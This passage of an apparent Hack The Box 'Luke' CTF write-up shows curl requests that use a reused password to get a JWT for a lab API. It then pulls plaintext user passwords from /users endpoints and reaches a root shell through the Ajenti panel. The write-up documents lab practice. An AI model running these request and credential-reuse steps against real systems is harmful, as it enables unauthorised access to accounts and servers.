</span></span></code></pre></div><p>If we try and emulate a form, we see that the <code>/login</code> endpoint returns us <code>bad request</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -F &#34;username=root&#34; -F &#34;password=Zk6heYCyvZk6heYCyv6ZE9Xcg&#34; -X POST http://10.10.10.137:3000/login
</span></span><span style="display:flex;"><span>Bad Request
</span></span></code></pre></div><p>Some <a href="https://medium.com/hyphe/token-based-authentication-in-node-6e8731bfd7f2" target="_blank">brief research</a> on NodeJS and JSON tokens shows us how to craft the proper header. Now, we&rsquo;re getting a <code>forbidden</code> response. This seems like our query is correct now, but our credentials are not.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -s -X POST -H &#39;Accept: application/json&#39; -H &#39;Content-Type: application/json&#39; --data &#39;{&#34;username&#34;:&#34;root&#34;,&#34;password&#34;:&#34;Zk6heYCyv6ZE9Xcg&#34;,&#34;rememberMe&#34;:true}&#39; http://10.10.10.137:3000/login
</span></span><span style="display:flex;"><span>Forbidden
</span></span></code></pre></div><p>Intuition was key to success here, as the username <code>admin</code> appears to also use the MySQL root password we&rsquo;ve previously found. Had we not added this to our list of usernames, we&rsquo;d have been dead in the water. We see below that we&rsquo;re given the JWT to authenticate us on port <code>3000</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -s -X POST -H &#39;Accept: application/json&#39; -H &#39;Content-Type: application/json&#39; --data &#39;{&#34;username&#34;:&#34;admin&#34;,&#34;password&#34;:&#34;Zk6heYCyv6ZE9Xcg&#34;,&#34;rememberMe&#34;:true}&#39; http://10.10.10.137:3000/login
</span></span><span style="display:flex;"><span>{&#34;success&#34;:true,&#34;message&#34;:&#34;Authentication successful!&#34;,&#34;token&#34;:&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI&#34;}r
</span></span></code></pre></div><p>Lets use this token to get more info if we can. After a little playing around with the request headers we&rsquo;re able to authenticate into the <code>/users</code> directory, which returns a list of usernames.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -H &#39;Accept: application/json&#39; -H &#34;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI&#34; http://10.10.10.137:3000/users
</span></span><span style="display:flex;"><span>[{&#34;ID&#34;:&#34;1&#34;,&#34;name&#34;:&#34;Admin&#34;,&#34;Role&#34;:&#34;Superuser&#34;},{&#34;ID&#34;:&#34;2&#34;,&#34;name&#34;:&#34;Derry&#34;,&#34;Role&#34;:&#34;Web Admin&#34;},{&#34;ID&#34;:&#34;3&#34;,&#34;name&#34;:&#34;Yuri&#34;,&#34;Role&#34;:&#34;Beta Tester&#34;},{&#34;ID&#34;:&#34;4&#34;,&#34;name&#34;:&#34;Dory&#34;,&#34;Role&#34;:&#34;Supporter&#34;}]
</span></span></code></pre></div><p>We also know that theres an endpoint <code>/users/admin</code>, and when we visit that we&rsquo;re given some credentials in plain text!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -H &#39;Accept: application/json&#39; -H &#34;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI&#34; http://10.10.10.137:3000/users/admin
</span></span><span style="display:flex;"><span>{&#34;name&#34;:&#34;Admin&#34;,&#34;password&#34;:&#34;WX5b7)&gt;/rp$U)FW&#34;}
</span></span></code></pre></div><p>The admin password above doesn&rsquo;t work on any of our login pages either, not in combination with any of our current usernames. So, after some head scratching there&rsquo;s more CTF intuition required. Perhaps other users on the site have their own API endpoints?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>root@kali:/media/sf_Research# curl -H &#39;Accept: application/json&#39; -H &#34;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI&#34; http://10.10.10.137:3000/users/derry
</span></span><span style="display:flex;"><span>{&#34;name&#34;:&#34;Derry&#34;,&#34;password&#34;:&#34;rZ86wwLvx7jUxtch&#34;}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>root@kali:/media/sf_Research# curl -H &#39;Accept: application/json&#39; -H &#34;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI&#34; http://10.10.10.137:3000/users/yuri
</span></span><span style="display:flex;"><span>{&#34;name&#34;:&#34;Yuri&#34;,&#34;password&#34;:&#34;bet@tester87&#34;}
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>root@kali:/media/sf_Research# curl -H &#39;Accept: application/json&#39; -H &#34;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYwNjQ4MDYwLCJleHAiOjE1NjA3MzQ0NjB9.mnXdriQeks-RRVtUmC5BnNl-P_HWWXhsb9fVQdJLmLI&#34; http://10.10.10.137:3000/users/dory
</span></span><span style="display:flex;"><span>{&#34;name&#34;:&#34;Dory&#34;,&#34;password&#34;:&#34;5y:!xa=ybfe)/QD&#34;}
</span></span></code></pre></div><p>This is great, we&rsquo;ve expanded on our list of usernames a little, and our list of credentials significantly. Lets recap what we have so far before we move on to try them out on the other login pages.</p>
<table>
  <thead>
      <tr>
          <th><strong>Potential Users</strong></th>
          <th><strong>Potential Passwords</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>admin</td>
          <td>WX5b7)&gt;/rp$U)FW</td>
      </tr>
      <tr>
          <td>derry</td>
          <td>rZ86wwLvx7jUxtch</td>
      </tr>
      <tr>
          <td>dory</td>
          <td>5y:!xa=ybfe)/QD</td>
      </tr>
      <tr>
          <td>yuri</td>
          <td>bet@tester87</td>
      </tr>
  </tbody>
</table>
<h3 id="management">Management</h3>
<p>The credentials we have obtained are again tried out port <code>8000</code>, but none of them are getting us in. So, we move on to the <code>/management</code> directory of port <code>80</code>. Since derry is the administrator of the site (as determined by the letter we found) we try his first. They work when we capitalize the first letter of his username.</p>
<p><img src="/posts/images/hack-the-box-luke-writeup/management.png" alt="/management directory, Username: Derry Password: rZ86wwLvx7jUxtch"></p>
<p>We see there&rsquo;s another login page here, so we add that to our list. There is also the <code>config.php</code> file we&rsquo;ve already seen before at the root of the web directory, and another configuration file <code>config.json</code>.</p>
<p><img src="/posts/images/hack-the-box-luke-writeup/config_son.png" alt="Ajenti config.json"></p>
<p>There is also another password <code>KpMasng6S5EtTy9Z</code>. Lets try and login to Ajenti yet again, this time using the password we&rsquo;ve just found. The username we&rsquo;ll try first is root, because that&rsquo;s also found in the configuration file.</p>
<p><img src="/posts/images/hack-the-box-luke-writeup/ajenti_auth.png" alt="Logged into Ajenti, game over!"></p>
<h3 id="user--root">user &amp;&amp; root</h3>
<p>Now that we&rsquo;re logged into Ajenti the only thing left to do is grab the flags. There is a file manager we could use to do this by navigating to the flags, or uploading our own shell. There&rsquo;s also a <code>Terminal</code> button on the menu, which allows us a root shell through the website, so lets use that.</p>
<p>It doesn&rsquo;t matter which flag we grab first, because this Ajenti web shell already has us as root! I chose to grab the root flag first due to excitement. We can&rsquo;t ignore the user flag of course so lets grab that next. Now, I don&rsquo;t know if they were joking, but I saw a discussion on HTB&rsquo;s forum involving &ldquo;privilege deescalation&rdquo;. I hope it was, because getting the flag involves simply navigating to derry&rsquo;s directory and looking at it.</p>
<p><img src="/posts/images/hack-the-box-luke-writeup/user.png" alt="Luke root and user flags"></p>
<h2 id="conclusion">Conclusion</h2>
<p>This box required a lot of enumeration. It required that we scan for files, and report <code>401</code> codes rather than ignoring them. Another lesson learned from this box was to save a list of user names and credentials as they&rsquo;re discovered. This box used a mixture of the user names and credentials we were able to find, and only by combining them in various ways were we able to gain access to the system.</p>

  
  <hr>
<div class="footer">
    
	    
            <a class="previous-post" href="/posts/how-i-do-my-ctf-writeups/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>How I Do My Ctf Writeups</a>
        
	    
            <div class="next-post">
                <a href="/posts/hack-the-box-swag-shop-writeup/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Hack the Box Swag Shop Writeup</a>
            </div>
        
    
</div>

  
</div>
            </main>
            
  

        </div>
    </body>
</html>
